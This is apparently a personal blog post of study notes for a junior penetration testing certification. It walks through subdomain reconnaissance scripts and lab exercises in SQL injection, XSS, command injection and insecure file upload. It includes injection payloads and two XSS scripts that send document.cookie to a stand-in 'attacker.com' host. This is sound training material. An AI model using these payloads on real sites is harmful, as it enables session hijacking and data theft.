---
layout: post
title: TCM - Web Vulnerabilities
subtitle: Preparing for PJPT (Practical Junior Penetration Tester) certification by walking through web vulnerabilities
tags: [ethical hacking, tcm, pjpt, web, lab building]
comments: true
author: Lantana Park
---

# Web hacking

## Web Application Enumeration

1.  Assetfinder - finding subdomains

    ![checkVersion](../assets/img/webRevisited/Screenshot%202024-07-23%20at%2009.52.36.png)

    ![install assetFinder](../assets/img/webRevisited/Screenshot%202024-07-23%20at%2009.52.47.png)

    ![assetFinder1](../assets/img/webRevisited/Screenshot%202024-07-23%20at%2009.53.10.png)

    ![assetFinder2](../assets/img/webRevisited/Screenshot%202024-07-23%20at%2009.53.50.png)

    ![asssetFinder3](../assets/img/webRevisited/Screenshot%202024-07-23%20at%2009.59.04.png)

    Made bash script to find subdomains using the assetfinder tool

    Check for arguments

    ```bash
    if [ -z "$1" ]; then
    echo "Usage: $0 <domain>"
    exit 1

    fi
    ```

    It is to check a domain argument is provided when running the script.

    Assign argument to variable

    ```bash
    url=$1
    ```

    This is to assign the domain name to the variable url

    Check for assetfinder installation

    ```bash
    if ! command -v assetfinder &> /dev/null; then
        echo "assetfinder could not be found, please install it first."
        exit
    fi
    ```

    Create Directories

    ```bash
    if [ ! -d "$url" ]; then
    mkdir "$url"
    fi

    if [ ! -d "$url/recon" ]; then
    mkdir "$url/recon"
    fi
    ```

    Run the assetFinder

    ```bash
    echo "[+] Harvesting subdomains with assetfinder..."
    assetfinder "$url" >> "$url/recon/assets.txt"
    ```

    Filter the subdomains to save only those containing the main domain and sub-domains in final.txt

    ```bash
    echo "[+] Filtering subdomains..."
    grep "$1" "$url/recon/assets.txt" >> "$url/recon/final.txt"
    rm "$url/recon/assets.txt"
    ```

    Completion

    ```bash
    echo "[+] Subdomain enumeration completed. Results saved in $url/recon/final.txt"
    ```

    ![myAssetFinderScript](../assets/img/webRevisited/Screenshot%202024-07-23%20at%2010.51.45.png)

    ![myAssetFinderScript.](../assets/img/webRevisited/Screenshot%202024-07-23%20at%2010.51.55.png)

    ![myAssetFinderScript..](../assets/img/webRevisited/Screenshot%202024-07-23%20at%2010.54.01.png)

    ![myAssetFinderScript1](../assets/img/webRevisited/Screenshot%202024-07-23%20at%2010.08.34.png)

    ![myAssetFinderScript2](../assets/img/webRevisited/Screenshot%202024-07-23%20at%2010.10.33.png)

    ![myAssetFinderScript3](../assets/img/webRevisited/Screenshot%202024-07-23%20at%2010.10.40.png)

    ![myAssetFinderScript4](../assets/img/webRevisited/Screenshot%202024-07-23%20at%2010.10.46.png)

    ![myAssetFinderScript5](../assets/img/webRevisited/Screenshot%202024-07-23%20at%2010.10.50.png)

    ![myAssetFinderScript6](../assets/img/webRevisited/Screenshot%202024-07-23%20at%2010.10.59.png)

2.  amass - finding subdomains in detail

    `amass` includes DNS records associated with the domain name.

    Install amass

    ![installAmass1](../assets/img/webRevisited/Screenshot%202024-07-23%20at%2011.25.46.png)

    ![installAmass2](../assets/img/webRevisited/Screenshot%202024-07-23%20at%2011.25.58.png)

    ![installAmass3](../assets/img/webRevisited/Screenshot%202024-07-23%20at%2011.26.48.png)

    ![runAmass1](../assets/img/webRevisited/Screenshot%202024-07-23%20at%2011.17.03.png)

    ![runAmass2](../assets/img/webRevisited/Screenshot%202024-07-23%20at%2011.20.40.png)

    for example,

    `tesla.com (FQDN) --> mx_record --> tesla-com.mail.protection.outlook.com (FQDN)`

    `mx_record` specify the mail servers responsible for receiving email on behalf of the domain.

    I can guess tesla uses outlook for their email services.

    Thus, I think `amass` helps me guess the domain's infrastructure.

3.  httprobe - finding alive domain

    Install `httprobe`

    ![httprobeInstall](../assets/img/webRevisited/Screenshot%202024-07-23%20at%2011.57.15.png)

    ![httprobeInstall2](../assets/img/webRevisited/Screenshot%202024-07-23%20at%2012.26.04.png)

    `httprobe` is a tool that makes requests to ports 80 or 443 to determine if a domain is alive. It does not consider the type of response it receives (e.g., 200, 300, 400, etc.).

    ![httprobe1](../assets/img/webRevisited/Screenshot%202024-07-23%20at%2012.26.18.png)

    ![httprobe2](../assets/img/webRevisited/Screenshot%202024-07-23%20at%2012.26.32.png)

    `-s` is to specify that only successful responses should be considered.

    `-p` is to specify the port number I want to recon.

    ![httprobe3](../assets/img/webRevisited/Screenshot%202024-07-23%20at%2012.26.45.png)

    In the command,

    `cat tesla.com/recon/final.txt | httprobe -s -p https:443 | sed 's/https\?:\/\///' | tr -d ':443'`

    first, I want to read the `final.txt` file.

    second, with this result, I will check if the domain is alive and responding https requests.

    third, I want to remove `https://` or `http://` prefixes from the URLs.

    fourth, I want to delete the port number `:443` from the URLs.

    ![httprobe4](../assets/img/webRevisited/Screenshot%202024-07-23%20at%2012.27.01.png)

    I inserted this script in `run.sh`

    ![httprobe5](../assets/img/webRevisited/Screenshot%202024-07-23%20at%2012.27.13.png)

    And then I can grep to filter domain names that I want to know.

    ![httprobe6](../assets/img/webRevisited/Screenshot%202024-07-23%20at%2012.27.19.png)

    ![httprobe7](../assets/img/webRevisited/Screenshot%202024-07-23%20at%2012.27.30.png)

    ![httprobe8](../assets/img/webRevisited/Screenshot%202024-07-23%20at%2012.27.25.png)

    ```bash
    #!/bin/bash

    if [ -z "$1" ]; then
    echo "Usage: $0 <domain>"
    exit 1
    fi

    url=$1

    if ! command -v assetfinder &> /dev/null; then
    echo "assetfinder could not be found, please install it first."
    exit
    fi

    if [ ! -d "$url" ]; then
    mkdir "$url"
    fi

    if [ ! -d "$url/recon" ]; then
    mkdir "$url/recon"
    fi

    echo "[+] Harvesting subdomains with assetfinder..."
    assetfinder "$url" >> "$url/recon/assets.txt"

    echo "[+] Filtering subdomains..."
    grep "$1" "$url/recon/assets.txt" >> "$url/recon/final.txt"
    rm "$url/recon/assets.txt"

    echo "[+] Probing for alive domains..."
    cat "$url/recon/final.txt" | sort -u | httprobe -p https:443 | sed 's/https\?:\/\///' | tr -d ':443' >> "$url/recon/alive.txt"

    echo "[+] Subdomain enumeration completed. Results saved in $url/recon"
    ```

4.  GoWitness - screenshotting websites

    gowitness to have a screenshotting of websites

    install `gowitness`

    ![installGowitness1](../assets/img/webRevisited/Screenshot%202024-07-23%20at%2014.01.45.png)

    I am not sure why I need to install `gorm.io`. Because, there is only instruction to write this command with no reason...

    However `gorm.io` is one of go lan library package.

    ![installGowitness2](../assets/img/webRevisited/Screenshot%202024-07-23%20at%2014.35.50.png)

    ![installGowitness3](../assets/img/webRevisited/Screenshot%202024-07-23%20at%2014.35.56.png)

    run `gowitenss`

    ![runGowitness1](../assets/img/webRevisited/Screenshot%202024-07-23%20at%2014.36.12.png)

    ![runGowitness2](../assets/img/webRevisited/Screenshot%202024-07-23%20at%2014.36.48.png)

5.  Multi-tasking enumeration with writing bash script

```bash
#!/bin/bash
url=$1
if [ ! -d "$url" ];then
    mkdir $url
fi
if [ ! -d "$url/recon" ];then
    mkdir $url/recon
fi
#    if [ ! -d '$url/recon/eyewitness' ];then
#        mkdir $url/recon/eyewitness
#    fi
if [ ! -d "$url/recon/scans" ];then
    mkdir $url/recon/scans
fi
if [ ! -d "$url/recon/httprobe" ];then
    mkdir $url/recon/httprobe
fi
if [ ! -d "$url/recon/potential_takeovers" ];then
    mkdir $url/recon/potential_takeovers
fi
if [ ! -d "$url/recon/wayback" ];then
    mkdir $url/recon/wayback
fi
if [ ! -d "$url/recon/wayback/params" ];then
    mkdir $url/recon/wayback/params
fi
if [ ! -d "$url/recon/wayback/extensions" ];then
    mkdir $url/recon/wayback/extensions
fi
if [ ! -f "$url/recon/httprobe/alive.txt" ];then
    touch $url/recon/httprobe/alive.txt
fi
if [ ! -f "$url/recon/final.txt" ];then
    touch $url/recon/final.txt
fi

echo "[+] Harvesting subdomains with assetfinder..."
assetfinder $url >> $url/recon/assets.txt
cat $url/recon/assets.txt | grep $1 >> $url/recon/final.txt
rm $url/recon/assets.txt

#echo "[+] Double checking for subdomains with amass..."
#amass enum -d $url >> $url/recon/f.txt
#sort -u $url/recon/f.txt >> $url/recon/final.txt
#rm $url/recon/f.txt

echo "[+] Probing for alive domains..."
cat $url/recon/final.txt | sort -u | httprobe -s -p https:443 | sed 's/https\?:\/\///' | tr -d ':443' >> $url/recon/httprobe/a.txt
sort -u $url/recon/httprobe/a.txt > $url/recon/httprobe/alive.txt
rm $url/recon/httprobe/a.txt

echo "[+] Checking for possible subdomain takeover..."

if [ ! -f "$url/recon/potential_takeovers/potential_takeovers.txt" ];then
    touch $url/recon/potential_takeovers/potential_takeovers.txt
fi

subjack -w $url/recon/final.txt -t 100 -timeout 30 -ssl -c ~/go/src/github.com/haccer/subjack/fingerprints.json -v 3 -o $url/recon/potential_takeovers/potential_takeovers.txt

echo "[+] Scanning for open ports..."
nmap -iL $url/recon/httprobe/alive.txt -T4 -oA $url/recon/scans/scanned.txt

echo "[+] Scraping wayback data..."
cat $url/recon/final.txt | waybackurls >> $url/recon/wayback/wayback_output.txt
sort -u $url/recon/wayback/wayback_output.txt

echo "[+] Pulling and compiling all possible params found in wayback data..."
cat $url/recon/wayback/wayback_output.txt | grep '?*=' | cut -d '=' -f 1 | sort -u >> $url/recon/wayback/params/wayback_params.txt
for line in $(cat $url/recon/wayback/params/wayback_params.txt);do echo $line'=';done

echo "[+] Pulling and compiling js/php/aspx/jsp/json files from wayback output..."
for line in $(cat $url/recon/wayback/wayback_output.txt);do
    ext="${line##*.}"
    if [[ "$ext" == "js" ]]; then
        echo $line >> $url/recon/wayback/extensions/js1.txt
        sort -u $url/recon/wayback/extensions/js1.txt >> $url/recon/wayback/extensions/js.txt
    fi
    if [[ "$ext" == "html" ]];then
        echo $line >> $url/recon/wayback/extensions/jsp1.txt
        sort -u $url/recon/wayback/extensions/jsp1.txt >> $url/recon/wayback/extensions/jsp.txt
    fi
    if [[ "$ext" == "json" ]];then
        echo $line >> $url/recon/wayback/extensions/json1.txt
        sort -u $url/recon/wayback/extensions/json1.txt >> $url/recon/wayback/extensions/json.txt
    fi
    if [[ "$ext" == "php" ]];then
        echo $line >> $url/recon/wayback/extensions/php1.txt
        sort -u $url/recon/wayback/extensions/php1.txt >> $url/recon/wayback/extensions/php.txt
    fi
    if [[ "$ext" == "aspx" ]];then
        echo $line >> $url/recon/wayback/extensions/aspx1.txt
        sort -u $url/recon/wayback/extensions/aspx1.txt >> $url/recon/wayback/extensions/aspx.txt
    fi
done

rm $url/recon/wayback/extensions/js1.txt
rm $url/recon/wayback/extensions/jsp1.txt
rm $url/recon/wayback/extensions/json1.txt
rm $url/recon/wayback/extensions/php1.txt
rm $url/recon/wayback/extensions/aspx1.txt
#echo "[+] Running eyewitness against all compiled domains..."
#python3 EyeWitness/EyeWitness.py --web -f $url/recon/httprobe/alive.txt -d $url/recon/eyewitness --resolve
```

## Find & Exploit Common web vulnerabilities

### Web hacking lab building

- Install Docker

![labInstall1](../assets/img/webRevisited/Screenshot%202024-07-23%20at%2017.49.57.png)

![labInstall2](../assets/img/webRevisited/Screenshot%202024-07-23%20at%2017.50.12.png)

- Install Docker-compose

![labInstall3](../assets/img/webRevisited/Screenshot%202024-07-23%20at%2017.50.40.png)

![labInstall4](../assets/img/webRevisited/Screenshot%202024-07-23%20at%2017.50.54.png)

![labInstall5](../assets/img/webRevisited/Screenshot%202024-07-23%20at%2017.51.02.png)

![labInstall6](../assets/img/webRevisited/Screenshot%202024-07-23%20at%2017.51.10.png)

- Download a compressed file `peh-web-labs.tar.gz` and run it

![labInstall7](../assets/img/webRevisited/Screenshot%202024-07-23%20at%2017.51.33.png)

![labInstall8](../assets/img/webRevisited/Screenshot%202024-07-23%20at%2017.51.38.png)

![labInstall9](../assets/img/webRevisited/Screenshot%202024-07-23%20at%2017.51.46.png)

![labInstall10](../assets/img/webRevisited/Screenshot%202024-07-23%20at%2017.51.53.png)

![labInstall11](../assets/img/webRevisited/Screenshot%202024-07-23%20at%2017.51.59.png)

![labInstall12](../assets/img/webRevisited/Screenshot%202024-07-23%20at%2017.52.06.png)

![labInstall13](../assets/img/webRevisited/Screenshot%202024-07-23%20at%2017.52.19.png)

![labInstall14](../assets/img/webRevisited/Screenshot%202024-07-23%20at%2017.53.34.png)

1. SQL injection attack

   SQLi can happens when user input is not properly sanitized.

   Checking SQL injection vulnerability

   `' or 1=1#` does work to retrieve usernames and passwords.

   This suggests that the database is highly likely to be MySQL because it correctly recognize `#` as comment.

   ![sqli1](../assets/img/sqli/Screenshot%202024-07-29%20at%2013.18.29.png)

   - UNION attack

     Attackers can use the `UNION` keyword to get data from other tables within the database.

     In order to work a `UNION` query, two key requirements must be satisfied:

     1. How many columns are being returned from the original query?

        **Method 1** - `ORDER BY`

        `bob' order by 1#`
        ![sqli2](../assets/img/sqli/Screenshot%202024-07-29%20at%2013.36.59.png)

        `bob' order by 2#`
        ![sqli3](../assets/img/sqli/Screenshot%202024-07-29%20at%2013.37.11.png)

        `bob' order by 3#`
        ![sqli4](../assets/img/sqli/Screenshot%202024-07-29%20at%2013.37.28.png)

        `bob' order by 4#`
        ![sqli5](../assets/img/sqli/Screenshot%202024-07-29%20at%2013.37.45.png)

        It gave me `No user found` result, then I could notice that the result set of the query has fewer than 4 columns.

        **Method 2** - `' UNION SELECT`

        `bob' union select null#`

        ![sqli6](../assets/img/sqli/Screenshot%202024-07-29%20at%2013.45.06.png)

        `bob' union select null, null#`

        ![sqli7](../assets/img/sqli/Screenshot%202024-07-29%20at%2013.45.28.png)

        `bob' union select null, null, null#`

        ![sqli8](../assets/img/sqli/Screenshot%202024-07-29%20at%2013.45.59.png)

        I was able to determine that the original query returns three columns.

        #### Why comments are important?

        By using comments, I can ensure that the database only execute the injected part of the query and the rest of the original query is ignored, preventing syntax errors and unintended results.

        #### Why NULL is used?

        `NULL` is compatible with any data type, so it helps avoid type mismatch errors.

     2. Which columns returned from the original query are of a suitable **data type** to hold the results from the injected query.

        After determining the number of required columns, I can probe each column to test whether it can hold string data. Because the interesting data that I want to retrieve is normally in string form.

        ![sqli9](../assets/img/sqli/Screenshot%202024-07-29%20at%2013.57.39.png)

        ![sqli10](../assets/img/sqli/Screenshot%202024-07-29%20at%2013.58.04.png)

        ![sqli11](../assets/img/sqli/Screenshot%202024-07-29%20at%2013.58.33.png)

        Since there were no errors, the three columns can handle string data.

        3. Use a SQL injection UNION attack to retrieve interesting data.

        Database version

        ![sqli12](../assets/img/sqli/Screenshot%202024-07-29%20at%2015.25.54.png)

        Table information

        ![table](../assets/img/sqli/Screenshot%202024-07-29%20at%2015.21.02.png)

        Column information

        ![column](../assets/img/sqli/Screenshot%202024-07-29%20at%2015.21.46.png)

        Password information

        ![password](../assets/img/sqli/Screenshot%202024-07-29%20at%2015.20.39.png)

        CHEAT SHEET

        https://portswigger.net/web-security/sql-injection/cheat-sheet

        - Blind SQL injection

        Check if this website is vulnerable to SQL injection

        I logged in this website using the given credentials `jeremy:jeremy`.

        ![blindInjection](../assets/img/sqli/Screenshot%202024-07-30%20at%2012.50.00.png)

        Made a repeater to the GET request.

        ![blindInjection2](../assets/img/sqli/Screenshot%202024-07-30%20at%2012.50.09.png)

        In this GET request, I sent a GET request to see if set-cookie value is used in a SQL query without proper sanitization.

        The two different requests to the server with slightly altered cookie value to see if the server's response changes.

        ![blindInjection3](../assets/img/sqli/Screenshot%202024-07-30%20at%2012.03.55.png)

        ![blindInjection4](../assets/img/sqli/Screenshot%202024-07-30%20at%2012.04.02.png)

        ![blindInjection5](../assets/img/sqli/Screenshot%202024-07-30%20at%2013.05.15.png)

        The website displayed the "Welcome to your dashboard!" message, it indicates that my injected condition was included in the SQL query and executed successfully.

        ![blindInjection6](../assets/img/sqli/Screenshot%202024-07-30%20at%2012.04.19.png)

        ![blindInjection7](../assets/img/sqli/Screenshot%202024-07-30%20at%2012.04.27.png)

        ![blindInjection8](../assets/img/sqli/Screenshot%202024-07-30%20at%2013.05.26.png)

        The website did not display the message, it indicates that the false condition caused the query to return no results.

        Let's find the database version using blind SQL injection.

        ![versionInjection1](../assets/img/sqli/Screenshot%202024-07-30%20at%2013.31.11.png)

        ![versionInjection2](../assets/img/sqli/Screenshot%202024-07-30%20at%2013.31.20.png)

        **8.X.X**

        ![versionInjection3](../assets/img/sqli/Screenshot%202024-07-30%20at%2013.20.38.png)

        **8.0.X**

        ![versionInjection4](../assets/img/sqli/Screenshot%202024-07-30%20at%2013.19.02.png)

        ![versionInjection5](../assets/img/sqli/Screenshot%202024-07-30%20at%2013.21.28.png)

        ![versionInjection6](../assets/img/sqli/Screenshot%202024-07-30%20at%2013.21.42.png)

        ![versionInjection6](../assets/img/sqli/Screenshot%202024-07-30%20at%2013.21.52.png)

        **8.0.3**

        Finally, let's find the password of user `jeremy`.

        ![passwordFinding](../assets/img/sqli/Screenshot%202024-07-30%20at%2013.43.02.png)

        ![passwordFinding2](../assets/img/sqli/Screenshot%202024-07-30%20at%2014.12.01.png)

        ![passwordFinding3](../assets/img/sqli/Screenshot%202024-07-30%20at%2014.13.39.png)

        ![passwordFinding4](../assets/img/sqli/Screenshot%202024-07-30%20at%2014.16.18.png)

        ![passwordFinding5](../assets/img/sqli/Screenshot%202024-07-30%20at%2014.17.12.png)

        ![passwordFinding6](../assets/img/sqli/Screenshot%202024-07-30%20at%2014.18.18.png)

        ![passwordFinding7](../assets/img/sqli/Screenshot%202024-07-30%20at%2014.18.09.png)

        The password was `jeremy`

        - Challenge : injection0x03

        Since there was cookie value, I did union attack to get the user information.

        Determining the number of columns

        ![determiningColumn1](../assets/img/sqli/Screenshot%202024-07-30%20at%2015.30.55.png)

        ![determiningColumn2](../assets/img/sqli/Screenshot%202024-07-30%20at%2015.31.11.png)

        ![determiningColumn3](../assets/img/sqli/Screenshot%202024-07-30%20at%2015.31.27.png)

        ![determiningColumn4](../assets/img/sqli/Screenshot%202024-07-30%20at%2015.31.46.png)

        Using the payload `' UNION SELECT null, null, null#` indicates that the website is vulnerable to SQL injection and suggests that the original query has at least three columns.

        Retrieving Tables

        ![tablesRetrieving1](../assets/img/sqli/Screenshot%202024-07-30%20at%2015.32.53.png)

        ![tableRetrieving2](../assets/img/sqli/Screenshot%202024-07-30%20at%2015.33.09.png)

        Retrieving Columns

        ![columnRetrieving1](../assets/img/sqli/Screenshot%202024-07-30%20at%2015.34.20.png)

        ![columnRetrieving2](../assets/img/sqli/Screenshot%202024-07-30%20at%2015.34.40.png)

        Retrieving password

        ![passwordRetrieving](../assets/img/sqli/Screenshot%202024-07-30%20at%2015.28.48.png)

        Retrieving username

        ![usernameRetrieving](../assets/img/sqli/Screenshot%202024-07-30%20at%2015.28.24.png)

        `takeshi`(username) : `onigirigadaisuki`(password)

2. XSS

It is injecting script (python, javascript, flask...) into a webpage. It can be called scripting injection.

- DOM-based XSS

A website can be vulnerable to DOM-based XSS when it runs locally without communicating with a server or database. And the website takes the data from an attacker-controllable source, such as the URL, and does not properly sanitized the user input into the DOM. So it allows attacker to execute malicious code and hijack other user's account.

Testing for DOM-based cross-site scripting vulnerability

When I add "hello" there is no `POST` or `PUT` event because this website is running locally and is based on the DOM. As a result, it can be vulnerable to DOM-based vulnerabilities.

![basicXSS](../assets/img/xss/Screenshot%202024-08-02%20at%2014.00.20.png)

I tried to inject the javascript. Even though I could insert this script on the list, but could not execute this script. I needed **a trigger** to make this script execute.

![basicXSS2](../assets/img/xss/Screenshot%202024-08-02%20at%2013.53.51.png)

To make advanced payloads, I used `<img>` scripting.

`<img src=x onerror=alert(1)>`

Instead of inserting image source, `x`can be replaced to show a broken image.

`onerror` is a event handler.

This payload successfully triggered the injected script.

![basicXSS3](../assets/img/xss/Screenshot%202024-08-02%20at%2014.54.08.png)

![basicXSS3-1](../assets/img/xss/Screenshot%202024-08-02%20at%2018.37.35.png)

XSS redirection is dangerous because it leverages the trust users have in a legitimate site to redirect them to malicious sites, leading to various security risks such as phishing, malware distribution, session hijacking, data theft, and browser exploitation. To prevent this attack, developers should validate and sanitize all user input to ensure that no malicious code can be executed.

Once I hit the add with this payload, the redirection was triggered.

`<img src=x onerror=window.location.href='https://www.google.com'>`

![basicXSS4](../assets/img/xss/Screenshot%202024-08-02%20at%2014.59.50.png)

![basicXSS5](../assets/img/xss/Screenshot%202024-08-02%20at%2014.59.59.png)

- Stored XSS

Stored XSS can occur when an application receives data from a database and includes that data in its later HTTP responses without properly sanitizing the user input.

For example, when a website allows users to submit comments on a blog post, attackers can submit a payload, and the payload supplied by the attacker can be executed in the victim's browser. Once the attacker triggers the scripting payload to get the session ID, this ID can be used to impersonate other users.

To test if stored XSS works, I made two containers, one has the cookie value, the other has no cookie value.

In the container1,

![xssStored1](../assets/img/xss/Screenshot%202024-08-04%20at%2011.27.57.png)

![xssStored2](../assets/img/xss/Screenshot%202024-08-04%20at%2011.28.01.png)

In the container2,

![xssStored3](../assets/img/xss/Screenshot%202024-08-04%20at%2011.29.19.png)

To test if stored xss works, I injected HTML tag and scripting payload in the container 1.

![xssTesting1](../assets/img/xss/Screenshot%202024-08-04%20at%2011.30.17.png)

![xssTesting2](../assets/img/xss/Screenshot%202024-08-04%20at%2011.30.30.png)

![xssTesting3](../assets/img/xss/Screenshot%202024-08-04%20at%2011.31.08.png)

![xssTesting4](../assets/img/xss/Screenshot%202024-08-04%20at%2011.31.18.png)

I could see the injected HTML and scripting payload in the container2.

![xssTesting5](../assets/img/xss/Screenshot%202024-08-04%20at%2011.30.46.png)

Refresh the page again, the injected payload was executed in the container 2 too.

![xssTesting6](../assets/img/xss/Screenshot%202024-08-04%20at%2011.31.56.png)

Let's check if the save cookie value from container 1 can be discovered in container 2.

I hit the add with this payload to see cookie value on the alert modal.

![xssExploitation1](../assets/img/xss/Screenshot%202024-08-04%20at%2011.59.42.png)

When I re-visit the container 1, I could see the saved cookie value. Since I saved the cookie value in container 1, I could see the cookie-value there.

![xssExploitation2](../assets/img/xss/Screenshot%202024-08-04%20at%2011.33.04.png)

![xssExploitation3](../assets/img/xss/Screenshot%202024-08-04%20at%2011.33.25.png)

If developer does not secure cookie setting like this.

```javascript
Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict
```

That website will be vulnerable to the XSS.

Possible attack scenarios for stored XSS

An attacker injects a malicious script below into a comment field on a website. When a user views the comment, the script executes and sends the user's session cookie to the attacker's server. The attacker then uses the stolen session cookie to impersonate the user and gain unauthorized access to the user's account.

Injectable payload

```javascript
<script>
  document.write('
  <img src="http://attacker.com/steal?cookie=' + document.cookie + '" />
  ');
</script>
```

```javascript
<script>
  fetch('http://attacker.com/steal?cookie=' +
  encodeURIComponent(document.cookie));
</script>
```

Capstone,

Let's find the admin cookie value,

Test if the webpage is vulnerable to the stored xss.

`<script>prompt(1)</script>`

![capstoneXSS1](../assets/img/xss/Screenshot%202024-08-04%20at%2015.41.46.png)

![capstoneXSS2](../assets/img/xss/Screenshot%202024-08-04%20at%2015.42.07.png)

It worked well. So I attempted to extract stored cookie.

![capstoneXSS3](../assets/img/xss/Screenshot%202024-08-04%20at%2015.38.08.png)

![capstoneXSS4](../assets/img/xss/Screenshot%202024-08-04%20at%2015.48.38.png)

![capstoneXSS5](../assets/img/xss/Screenshot%202024-08-04%20at%2015.49.12.png)

![capstoneXSS6](../assets/img/xss/Screenshot%202024-08-04%20at%2015.39.09.png)

**React.js can be vulnerable to XSS**

3. Command injection

- Basic command injection

It is to inject command on the user input. Attackers can manipulate an application to execute arbitrary system commands on the server.

Testing if this website is vulnerable to command injection.

![testingCI1](../assets/img/commandInjection/Screenshot%202024-08-05%20at%2009.15.16.png)

![testingCI2](../assets/img/commandInjection/Screenshot%202024-08-05%20at%2009.15.34.png)

I appended a non-existent command at the end of the payload because `; whoami` did not return any result. Adding wrong commands, such as `asd`, `abc`, or `abcd`, at the end ensures that the application reveals as much information as possible about its command execution process.

![testingCI3](../assets/img/commandInjection/Screenshot%202024-08-05%20at%2010.02.06.png)

![testingCI4](../assets/img/commandInjection/Screenshot%202024-08-05%20at%2010.09.58.png)

Let's try to get a shell by commanding payloads.

![exploitationCI1](../assets/img/commandInjection/Screenshot%202024-08-05%20at%2010.32.52.png)

![exploitationCI2](../assets/img/commandInjection/Screenshot%202024-08-05%20at%2010.32.46.png)

![exploitationCI3](../assets/img/commandInjection/Screenshot%202024-08-05%20at%2010.35.10.png)

![exploitationCI4](../assets/img/commandInjection/Screenshot%202024-08-05%20at%2010.35.30.png)

![exploitationCI5](../assets/img/commandInjection/Screenshot%202024-08-05%20at%2010.35.10.png)

![exploitationCI6](../assets/img/commandInjection/Screenshot%202024-08-05%20at%2010.35.36.png)

![exploitationCI7](../assets/img/commandInjection/Screenshot%202024-08-05%20at%2010.46.08.png)

- Blind / Out-of-Band (0X02)

Many examples of command injection are blind vulnerabilities. In reality, the website does not return the output from the command within its HTTP response. So the attacker should infer success based on application responses, changes in behavior, or side effects.

Test

![testBlindCI1](../assets/img/commandInjection/Screenshot%202024-08-05%20at%2011.00.45.png)

![testBlindCI2](../assets/img/commandInjection/Screenshot%202024-08-05%20at%2011.33.01.png)

![testBlindCI3](../assets/img/commandInjection/Screenshot%202024-08-05%20at%2011.36.01.png)

![testBlindCI4](../assets/img/commandInjection/Screenshot%202024-08-05%20at%2011.36.41.png)

![testBlindCI5](../assets/img/commandInjection/Screenshot%202024-08-05%20at%2011.36.54.png)

![testBlindCI6](../assets/img/commandInjection/Screenshot%202024-08-05%20at%2011.41.17.png)

![testBlindCI7](../assets/img/commandInjection/Screenshot%202024-08-05%20at%2011.42.22.png)

![testBlindCI8](../assets/img/commandInjection/Screenshot%202024-08-05%20at%2011.42.27.png)

![testBlindCI9](../assets/img/commandInjection/Screenshot%202024-08-05%20at%2011.42.27.png)

With these commands and responses, I was able to confirm that the command injection worked. I have already prepared a PHP reverse shell file to obtain a shell.

![exploitationCI1](../assets/img/commandInjection/Screenshot%202024-08-05%20at%2012.14.46.png)

Saved this file to the target server.

![exploitationCI2](../assets/img/commandInjection/Screenshot%202024-08-05%20at%2012.07.38.png)

![exploitationCI3](../assets/img/commandInjection/Screenshot%202024-08-05%20at%2012.07.48.png)

![exploitationCI4](../assets/img/commandInjection/Screenshot%202024-08-05%20at%2012.15.09.png)

![exploitationCI5](../assets/img/commandInjection/Screenshot%202024-08-05%20at%2012.09.47.png)

![exploitationCI6](../assets/img/commandInjection/Screenshot%202024-08-05%20at%2012.34.09.png)

- Challenge

Test to know which result I can get.

![commandInjection1](../assets/img/commandInjection/Screenshot%202024-08-05%20at%2019.25.16.png)

This application was using `awk` to execute a command with user-provided input.

![commandInjection2](../assets/img/commandInjection/Screenshot%202024-08-05%20at%2019.25.22.png)

It turned into moving from parked.

![commandInjection3](../assets/img/commandInjection/Screenshot%202024-08-05%20at%2020.05.08.png)

According to the result, I decided to input the payload on the third input and then add the payload within the awk command.

![commandInjection4](../assets/img/commandInjection/Screenshot%202024-08-05%20at%2019.25.45.png)

![commandInjection5](../assets/img/commandInjection/Screenshot%202024-08-05%20at%2019.25.54.png)

![commandInjection6](../assets/img/commandInjection/Screenshot%202024-08-05%20at%2019.17.21.png)

![commandInjection7](../assets/img/commandInjection/Screenshot%202024-08-05%20at%2019.17.28.png)

I appended `#` to comment out the rest of the line, `)^2))}'`, after the injected `whoami`.

Attempted to exploit.

![commandInjection8](../assets/img/commandInjection/Screenshot%202024-08-05%20at%2019.21.07.png)

![commandInjection8](../assets/img/commandInjection/Screenshot%202024-08-05%20at%2019.20.54.png)

![commandInjection9](../assets/img/commandInjection/Screenshot%202024-08-05%20at%2019.21.16.png)

4. Insecure File Upload

This attack can be happened when a web server allows users to upload files to its filesystem without sufficiently sanitizing/validating the form. If so, attacker can attempt to upload files (such as `.php`, `.jsp`) that enables remote code execution.

- Basic Bypass

Test

I attempted to upload `.txt` file

![uploadFile1](../assets/img/insecureFileUpload/Screenshot%202024-08-06%20at%2009.31.02.png)

![uploadFile2](../assets/img/insecureFileUpload/Screenshot%202024-08-06%20at%2009.30.24.png)

and then `.png` file.

![uploadFile3](../assets/img/insecureFileUpload/Screenshot%202024-08-06%20at%2010.15.12.png)

![uploadFile4](../assets/img/insecureFileUpload/Screenshot%202024-08-06%20at%2009.28.14.png)

![uploadFile5](../assets/img/insecureFileUpload/Screenshot%202024-08-06%20at%2009.28.31.png)

Let's make a repeater to make some modified sends.

Firstly, I uploaded `.txt` file.

![uploadFile6](../assets/img/insecureFileUpload/Screenshot%202024-08-06%20at%2009.29.22.png)

That means file upload form is only validating the file on the client side, not server side.

Secondly, I successfully uploaded `.php` file which allows reversing shell.

![uploadFile7](../assets/img/insecureFileUpload/Screenshot%202024-08-06%20at%2010.22.17.png)

![uploadFile8](../assets/img/insecureFileUpload/Screenshot%202024-08-06%20at%2010.22.41.png)

I needed to find the foothold to run this php file to do the remote code execution.

For finding where the files are stored,

![uploadFile9](../assets/img/insecureFileUpload/Screenshot%202024-08-06%20at%2009.50.56.png)

![uploadFile10](../assets/img/insecureFileUpload/Screenshot%202024-08-06%20at%2009.55.28.png)

![uploadFile11](../assets/img/insecureFileUpload/Screenshot%202024-08-06%20at%2009.55.17.png)

![uploadFile12](../assets/img/insecureFileUpload/Screenshot%202024-08-06%20at%2009.51.12.png)

![uploadFile13](../assets/img/insecureFileUpload/Screenshot%202024-08-06%20at%2009.55.45.png)

![uploadFile14](../assets/img/insecureFileUpload/Screenshot%202024-08-06%20at%2009.56.07.png)

I executed the code remotely.

![uploadFile15](../assets/img/insecureFileUpload/Screenshot%202024-08-06%20at%2010.48.42.png)

![uploadFile16](../assets/img/insecureFileUpload/Screenshot%202024-08-06%20at%2009.54.28.png)

![uploadFile17](../assets/img/insecureFileUpload/Screenshot%202024-08-06%20at%2010.48.54.png)

- Magic Bytes

Some applications identify file type based on their first signature bytes. So I embedded the php payload in the middle of png payload.

relevant resources:
